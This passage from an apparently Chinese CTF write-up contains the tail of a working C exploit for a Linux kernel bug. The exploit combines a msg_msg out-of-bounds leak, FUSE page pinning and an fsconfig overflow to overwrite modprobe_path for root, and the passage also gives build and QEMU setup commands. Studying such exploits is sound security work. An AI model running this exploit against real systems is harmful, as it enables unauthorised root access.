class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for oob reading...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> recv_size;</span><br><span class="line">        <span class="comment">// memset(buf, &#x27;\0&#x27;, 0xfd0 + 0xfd0);</span></span><br><span class="line">        recv_size = msgrcv(msqid[i], buf, <span class="number">0xfd0</span> + <span class="number">0xff0</span> - <span class="number">8</span> + <span class="number">0x10</span>, <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        <span class="keyword">if</span> (recv_size &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error code :%d\n&quot;</span>, recv_size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error index:%d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recv_size == (<span class="number">0xfd0</span> + <span class="number">0x18</span>))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">0xfd0</span> + <span class="number">0xfd0</span>); j += <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)(buf + j) &gt; kernel_base &amp;&amp; (*(<span class="keyword">uint64_t</span> *)(buf + j) &amp; <span class="number">0xfff</span>) == <span class="number">0x140</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] get data leak: %p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(buf + j));</span><br><span class="line">                kernel_addr = *(<span class="keyword">uint64_t</span> *)(buf + j);</span><br><span class="line">                kernel_base = kernel_addr - <span class="number">0x36f140</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to leak kernel base!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    modprobe_path = <span class="number">0xffffffff82891780</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe_path: %lx\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> evil_file_fd;</span><br><span class="line">    <span class="keyword">int</span> ms_qid;</span><br><span class="line"></span><br><span class="line">    evil_file_fd = open(<span class="string">&quot;./temp/evil&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (evil_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open evil file in FUSE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *nearby_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *evil_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1338000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                   MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (evil_page != (<span class="keyword">char</span> *)<span class="number">0x1338000</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to map for FUSE file!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(nearby_page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;try %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        exp_fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exp_fs_fd &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">        <span class="comment">// write(pipe_fd[1], &amp;exp_fs_fd, 4);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">            fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pthread_t</span> thr;</span><br><span class="line">        pthread_create(&amp;thr, <span class="literal">NULL</span>, change_next, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(ms_qid, evil_page - <span class="number">0xfd0</span> + <span class="number">0x8</span>, <span class="number">0xfd0</span> + <span class="number">0x18</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        pthread_join(thr, <span class="literal">NULL</span>);</span><br><span class="line">        i++;</span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (flag_fd &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><p>首先在虚拟机中跑<code>FUSE</code>时踩了一个大坑，在一篇文章中( 这里提到的文章就不放出来了，可能是师傅们不小心写错了 )指出<code>FUSE</code>无法在ctf环境中运行是因为<code>bzImage</code>的问题，经过询问发现其问题主要是文件系统过于残缺导致的。随后听取a3佬的意见更多的学习了fuse原理之后成功解决了问题，我这里使用的是<code>syzkaller</code>中的工具使用<code>debootstrap</code>搭建的一个文件系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=chroot</span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring,libselinux1-dev,fuse3,libfuse3-3,libfuse3-dev,libfuse2,libfuse-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(uname -m)</span><br><span class="line">RELEASE=bullseye</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span>)</span><br><span class="line">            display_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">        ;;</span><br><span class="line">        -a | --arch)</span><br><span class="line">            ARCH=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -d | --distribution)</span><br><span class="line">            RELEASE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -f | --feature)</span><br><span class="line">            FEATURE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -s | --seek)</span><br><span class="line">            SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -p | --add-perf)</span><br><span class="line">            PERF=<span class="literal">true</span></span><br><span class="line">            <span class="built_in">shift</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        -*)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        *)  <span class="comment"># No more options</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    ppc64le)</span><br><span class="line">        DEBARCH=ppc64el</span><br><span class="line">    ;;</span><br><span class="line">    aarch64)</span><br><span class="line">        DEBARCH=arm64</span><br><span class="line">    ;;</span><br><span class="line">    arm)</span><br><span class="line">        DEBARCH=armel</span><br><span class="line">    ;;</span><br><span class="line">    x86_64)</span><br><span class="line">        DEBARCH=amd64</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(uname -m) ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(uname -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        FOREIGN=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Check for according qemu static binary</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># Check for according binfmt entry</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> = <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo rm -rf <span class="variable">$DIR</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span></span><br><span class="line">sudo chmod 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --no-check-gpg --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free,non-free-firmware <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo --preserve-env=http_proxy,https_proxy,ftp_proxy,no_proxy debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    sudo cp $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line">cat <span class="variable">$RELEASE</span>.id_rsa.pub | sudo tee <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    cp -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line">    BASENAME=$(basename <span class="variable">$KERNEL</span>)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line">    rm -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo mkdir -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo cp -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure>

<p>因为我也稍做了点修改，怕以后忘记了这里贴出来记录一下。</p>
<p>第二个坑就是关于上面提到的内部隔离问题，同样也是在某位师傅的博客文章中提到了在<code>linux kernel 5.14</code>以前不存在内部隔离问题，随即居然以下犯上去说a3师傅写的ctfwiki错了，在经过几天挣扎之后终于注意到了在<code>linux kernel 5.9</code>以前的内部隔离实现。</p>
<p>再记录一下编译选项</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -masm=intel -static -no-pie -Wall -D_FILE_OFFSET_BITS=64 -I./libfuse libfuse3.a -g -lpthread -o exp -w</span><br><span class="line"><span class="comment"># make fuse</span></span><br><span class="line">sudo mount bullseye.img rootfs</span><br><span class="line">sudo cp exp rootfs/home/<span class="built_in">test</span></span><br><span class="line">objdump -d ./exp &gt; exp.txt</span><br><span class="line">sudo mkdir rootfs/home/<span class="built_in">test</span>/temp</span><br><span class="line">sudo umount rootfs</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -kernel ./vmlinux \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 root=/dev/sda 